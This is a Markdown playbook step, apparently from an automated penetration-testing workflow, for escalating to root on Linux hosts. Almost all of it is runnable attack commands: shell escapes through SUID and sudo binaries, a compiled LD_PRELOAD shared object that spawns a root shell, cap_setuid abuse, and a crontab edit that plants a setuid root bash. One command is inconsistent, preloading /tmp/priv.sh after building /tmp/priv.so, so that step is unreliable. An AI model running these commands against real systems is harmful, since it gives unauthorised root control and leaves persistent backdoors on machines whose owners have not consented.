# Privilege Escalation — Verify SUID & Sudo Vectors

## Purpose
Exploit SUID binaries and sudo privileges discovered during discovery/probe phases. Each binary follows GTFOBins patterns to escalate to root.

## Required Variables
- \$LHOST: attacker IP for reverse shells
- \$LPORT: attacker listener port

## Commands

```bash
find . -exec /bin/sh -p \; -quit

vim -c ':!sh'

bash -p

awk 'BEGIN {system("/bin/sh")}'

python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

perl -e 'exec "/bin/sh";'

less /etc/profile
!/bin/sh

man man
!/bin/sh

nmap --interactive
nmap> !sh

more /etc/hosts
!/bin/sh

sudo vim -c ':!sh'

sudo find . -exec /bin/sh -p \; -quit

sudo awk 'BEGIN {system("/bin/sh -p")}'

sudo python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

sudo perl -e 'exec "/bin/sh";'
```

If sudo allows LD_PRELOAD or env_keep abuse:

```bash
echo '#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0); setuid(0);
system("/bin/sh");
}' > /tmp/priv.c && gcc -shared -fPIC -o /tmp/priv.so /tmp/priv.c -nostartfiles

sudo LD_PRELOAD=/tmp/priv.sh /usr/bin/id
```

If `sudo -l` shows `(root) SETENV: NOPASSWD:` with env_keep+=LD_PRELOAD, use the above .so with `sudo LD_PRELOAD=/tmp/priv.so <allowed_command>`.

For capability abuse:

```bash
getcap -r / 2>/dev/null | grep cap_setuid
# If python3 has cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

For writable cron jobs as root:

```bash
echo "cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell" >> /etc/crontab 2>/dev/null
sleep 60
/tmp/rootshell -p
```

## Detection Signals
- Shell prompt changes from `$` to `#` after command execution
- `id` output shows `uid=0(root) gid=0(root)`
- Binary listed in `sudo -l` matches GTFOBins entry
- `getcap` output includes `cap_setuid+ep` on scripting interpreters

## Next
├── If root shell obtained → go to 05-evidence-collection
├── If sudo abuse failed but SUID binary works → go to 05-evidence-collection
├── If all vectors exhausted without root → go to 04-impact-escalation
├── If binary appears exploitable but fails → go to 06-false-positive-filter